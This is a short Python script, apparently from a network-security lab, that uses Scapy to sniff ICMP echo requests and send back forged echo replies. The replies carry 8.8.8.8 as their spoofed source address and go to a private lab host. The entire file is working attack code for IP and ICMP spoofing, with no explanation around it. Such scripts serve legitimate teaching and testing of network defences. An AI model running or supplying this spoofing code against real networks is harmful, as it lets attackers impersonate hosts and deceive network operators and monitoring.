#!/usr/bin/python3
from scapy.all import *

TARGET = '192.168.41.140'
spoof_ip = '8.8.8.8'

def spoof(pkt):
	pkt.show()
	ip = IP()
	ip.src = spoof_ip
	ip.dst = TARGET
	icmp = ICMP()
	icmp.type = 'echo-reply'
	icmp.id = pkt[2].id
	icmp.seq = pkt[2].seq
	p = ip/icmp/pkt[3]
	send(p)

pkt = sniff(filter='icmp[icmptype] == icmp-echo', prn=spoof)

